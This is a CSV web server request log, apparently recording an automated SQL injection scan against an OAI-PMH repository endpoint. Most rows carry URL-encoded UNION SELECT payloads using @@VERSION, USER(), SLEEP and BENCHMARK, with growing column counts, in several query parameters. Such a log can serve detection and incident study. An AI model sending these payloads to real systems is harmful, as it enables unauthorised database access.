uuid,timestamp,http_status_code,request_url,response_time,http_version
6af7ab61-6ab4-43fd-94cd-85a274d22be0,2025-01-28 08:53:42,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%23&metadataPrefix=oai_dc,48.95 ms,HTTP/1.1
6dca98a5-d5dd-458a-9d39-c65ddd4397ff,2025-01-28 08:53:43,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23,100.40 ms,HTTP/1.1
eab0ae12-a591-44d3-9b3b-5619259f0bd7,2025-01-28 08:53:43,200,http://islandora.io/oai/request?verb=ListMetadataFormats,64.35 ms,HTTP/1.1
776d7259-836e-4370-a56a-5426d0255fe5,2025-01-28 08:53:43,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23,46.68 ms,HTTP/1.1
f178ce43-8beb-4456-b061-e7188cd66f2d,2025-01-28 08:53:44,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23,35.44 ms,HTTP/1.1
42882a8d-8a06-425c-821d-8f6ab7303389,2025-01-28 08:53:44,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23,61.37 ms,HTTP/1.1
8a11663d-7b00-465c-9e9a-fb71699724c1,2025-01-28 08:53:44,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23&metadataPrefix=marc,49.33 ms,HTTP/1.1
60222026-d5a6-4ffe-99ab-6dd9ca051303,2025-01-28 08:53:45,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23,44.13 ms,HTTP/1.1
dbf0c35d-97e4-4009-b4a0-39d1d75551c3,2025-01-28 08:53:45,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23,48.63 ms,HTTP/1.1
93e6fb96-bdfb-4f77-a311-cbc3aab3266a,2025-01-28 08:53:45,200,http://islandora.io/oai/request?verb=ListSets,53.02 ms,HTTP/1.1
6f133688-dfc8-4808-b94d-0505c3459a6d,2025-01-28 08:53:46,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23,92.42 ms,HTTP/1.1
9734f25b-9a32-44b3-b22f-b433a3eca901,2025-01-28 08:53:46,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23,55.76 ms,HTTP/1.1
3ad78ba6-959f-4e40-a093-dde1cf517cf7,2025-01-28 08:53:46,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23&metadataPrefix=oai_dc,48.02 ms,HTTP/1.1
1f233a74-ae95-4cee-b407-37979c63eb05,2025-01-28 08:53:47,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23,51.98 ms,HTTP/1.1
2db24add-1288-4edb-83da-9aa2c68bddf3,2025-01-28 08:53:47,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23,56.23 ms,HTTP/1.1
e4a5e6fd-e9a6-4f3c-81d8-70a1ca133a2a,2025-01-28 08:53:47,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23,49.96 ms,HTTP/1.1
f0af4a2f-21c1-4044-aaf6-eaad88d30c47,2025-01-28 08:53:48,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23,70.82 ms,HTTP/1.1
23150077-eb69-4c08-b848-1b4b34e06d81,2025-01-28 08:53:48,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23,152.18 ms,HTTP/1.1
d345f7d1-0b19-40bb-b29d-4a2509533c45,2025-01-28 08:53:49,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23&metadataPrefix=oai_dc,40.75 ms,HTTP/1.1
9e27f283-b711-4df2-9d5e-42248ea21126,2025-01-28 08:53:49,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%23,44.45 ms,HTTP/1.1
806b1359-1d4d-4616-8f8f-a16dab2849c4,2025-01-28 08:53:49,200,http://islandora.io/oai/request?verb=ListMetadataFormats,50.06 ms,HTTP/1.1
1d543697-841b-4ae0-bdf1-e69dfcf01aac,2025-01-28 08:53:50,200,http://islandora.io/oai/request?verb=ListSets,53.62 ms,HTTP/1.1
85c2f4a1-50b0-4d9d-b484-9c5a5fe2b2c1,2025-01-28 08:53:50,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%23,69.17 ms,HTTP/1.1
a32c86d6-ca0e-4380-bee7-56d3a51db1c0,2025-01-28 08:53:50,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%23,63.62 ms,HTTP/1.1
adfdf251-7e1d-4623-913b-cf9d40dd12b1,2025-01-28 08:53:51,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%23&metadataPrefix=oai_dc,57.37 ms,HTTP/1.1
a28e45e6-3781-4eb8-ab6a-c728dc2855ee,2025-01-28 08:53:51,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%23,69.16 ms,HTTP/1.1
4c988900-fba8-4c4d-885e-e4296dd9bd3e,2025-01-28 08:53:51,200,http://islandora.io/oai/request?verb=ListMetadataFormats,29.54 ms,HTTP/1.1
85c6575a-8945-400d-9d8d-4a1a01f98863,2025-01-28 08:53:52,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%23,50.75 ms,HTTP/1.1
780b1291-3d06-455a-ae16-c916dafa0e06,2025-01-28 08:53:52,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%23,61.49 ms,HTTP/1.1
60114834-7f31-40e6-9ec8-0d84627d2156,2025-01-28 08:53:52,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,50.62 ms,HTTP/1.1
a024d86f-23a9-4ea4-a016-48370a6297e1,2025-01-28 08:53:53,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%23&metadataPrefix=oai_dc,78.30 ms,HTTP/1.1
8ce40179-0238-4753-b7da-7be258099010,2025-01-28 08:53:53,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+USER%28%29--,53.73 ms,HTTP/1.1
b730b263-bb72-4ef2-9612-a9a80ad9c6f4,2025-01-28 08:53:53,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+ALL+SELECT+USER%28%29--,64.58 ms,HTTP/1.1
d53b558f-197d-480d-8c55-e30556d5ee6f,2025-01-28 08:53:54,200,http://islandora.io/oai/request?verb=ListSets,52.34 ms,HTTP/1.1
02f71cc8-8b7a-4d23-9891-698f3f404a01,2025-01-28 08:53:54,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=UNION+ALL+SELECT+USER%28%29--&until=UNION+ALL+SELECT+USER%28%29--&set=UNION+ALL+SELECT+USER%28%29--,95.64 ms,HTTP/1.1
add73da5-dc22-44a9-ad9e-379b719a35b6,2025-01-28 08:53:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=UNION+ALL+SELECT+USER%28%29--,114.77 ms,HTTP/1.1
27b94ad7-6396-470f-af06-5349a12f2009,2025-01-28 08:53:55,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+USER%28%29--&metadataPrefix=marc,44.81 ms,HTTP/1.1
5c43f0c5-c88e-4ea4-a278-716ce6d94240,2025-01-28 08:53:55,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+SLEEP%285%29--,66.13 ms,HTTP/1.1
da5c9203-a4ae-4e61-8bfb-ea69ef5b494c,2025-01-28 08:53:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats,42.97 ms,HTTP/1.1
7ede4b60-f42c-49c9-960c-9d24921a83fe,2025-01-28 08:53:56,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+ALL+SELECT+SLEEP%285%29--,46.57 ms,HTTP/1.1
2517854e-1607-432d-8f4f-26ea9d64694a,2025-01-28 08:53:56,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=UNION+ALL+SELECT+SLEEP%285%29--&until=UNION+ALL+SELECT+SLEEP%285%29--,60.41 ms,HTTP/1.1
752b8665-d981-414c-a873-06b763eaf288,2025-01-28 08:53:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,54.77 ms,HTTP/1.1
99681f5f-7fac-4eec-a3f5-7f75e0555d2a,2025-01-28 08:53:57,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+SLEEP%285%29--&metadataPrefix=oai_dc,66.96 ms,HTTP/1.1
ebc853b6-76d6-4791-98cb-242edb069be4,2025-01-28 08:53:57,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+USER%28%29%2CSLEEP%285%29--,53.17 ms,HTTP/1.1
dc4295ce-2b1c-4a57-ad2d-567a76bd5c5a,2025-01-28 08:53:58,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+ALL+SELECT+USER%28%29%2CSLEEP%285%29--,70.55 ms,HTTP/1.1
7076aeba-6fb2-482c-ab3d-6827cf6f03ec,2025-01-28 08:53:58,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+ALL+SELECT+USER%28%29%2CSLEEP%285%29--,39.90 ms,HTTP/1.1
5eef9ece-2ab1-41f7-9aac-c740ef5d472e,2025-01-28 08:53:58,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=UNION+ALL+SELECT+USER%28%29%2CSLEEP%285%29--,66.50 ms,HTTP/1.1
615e2500-06b6-4862-8e2c-b5040662e9e6,2025-01-28 08:53:59,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,98.42 ms,HTTP/1.1
febac2ce-569b-4220-855e-7a88c18e7eb8,2025-01-28 08:53:59,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+USER%28%29%2CSLEEP%285%29--&metadataPrefix=oai_dc,41.55 ms,HTTP/1.1
623c9927-a316-43b7-8a36-f0d9c748cf8b,2025-01-28 08:53:59,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--,65.48 ms,HTTP/1.1
284ae5bf-4289-4182-818e-0a25fe77be22,2025-01-28 08:54:00,200,http://islandora.io/oai/request?verb=ListMetadataFormats,61.68 ms,HTTP/1.1
8604aca8-eba0-4405-a241-8ec714c9239b,2025-01-28 08:54:00,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--,43.36 ms,HTTP/1.1
a93f05cd-0698-45a8-a4a2-c880c73eb769,2025-01-28 08:54:01,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--&until=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--,56.11 ms,HTTP/1.1
87eecb6b-d652-4a82-83a3-25460ef8d32f,2025-01-28 08:54:01,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--&until=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--&set=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--,43.34 ms,HTTP/1.1
20008021-b082-47de-a96e-fcf75ab9c774,2025-01-28 08:54:01,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--&metadataPrefix=oai_dc,48.50 ms,HTTP/1.1
8d7ab203-0ec1-45d4-a1d3-50ffa01b3e5f,2025-01-28 08:54:02,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29--,74.19 ms,HTTP/1.1
583c1ebb-404d-4d45-b8a7-83ec0a6c2d14,2025-01-28 08:54:02,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.07 ms,HTTP/1.1
9293fdca-1b97-4d0c-9a26-a29b541da7a0,2025-01-28 08:54:02,200,http://islandora.io/oai/request?verb=ListSets,52.54 ms,HTTP/1.1
1b3c6541-e8ca-424f-982d-fff43e35c312,2025-01-28 08:54:03,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29--&until=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29--,50.20 ms,HTTP/1.1
8a0ce0b7-7ef0-40c2-a27e-55270ec86811,2025-01-28 08:54:03,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,178.89 ms,HTTP/1.1
901a2f3d-6e8c-4ca4-9e8d-49906382772e,2025-01-28 08:54:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29--&metadataPrefix=marc,60.01 ms,HTTP/1.1
0057567a-0dca-4f14-945f-2f4e0dabea79,2025-01-28 08:54:04,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--,49.75 ms,HTTP/1.1
aa8dfb5b-888c-4e26-915f-cf7575fb7d6b,2025-01-28 08:54:04,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--,43.74 ms,HTTP/1.1
e562c7ac-2316-4e2c-a64f-2b3151a97840,2025-01-28 08:54:05,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--,74.31 ms,HTTP/1.1
e355ba71-1c12-46f3-a14f-958133e2bed9,2025-01-28 08:54:05,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--,66.30 ms,HTTP/1.1
ca9e8b6a-2a61-465c-b416-1d34ccb727b2,2025-01-28 08:54:05,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--&until=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--&set=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--,65.55 ms,HTTP/1.1
881b3e11-203b-450a-afcc-9663390537df,2025-01-28 08:54:06,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--&metadataPrefix=oai_dc,85.82 ms,HTTP/1.1
9956e3e8-d08f-49f0-9b55-86b439bcc783,2025-01-28 08:54:06,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL--,67.64 ms,HTTP/1.1
06c0e6da-23e0-41f2-bfad-fe79fc9a0779,2025-01-28 08:54:06,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL--,52.69 ms,HTTP/1.1
62958625-1068-4a87-ae2b-db0b1519d678,2025-01-28 08:54:07,200,http://islandora.io/oai/request?verb=ListSets,54.86 ms,HTTP/1.1
144782aa-51fe-4a2a-b9ee-ee9f14bec8a0,2025-01-28 08:54:07,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL--,51.41 ms,HTTP/1.1
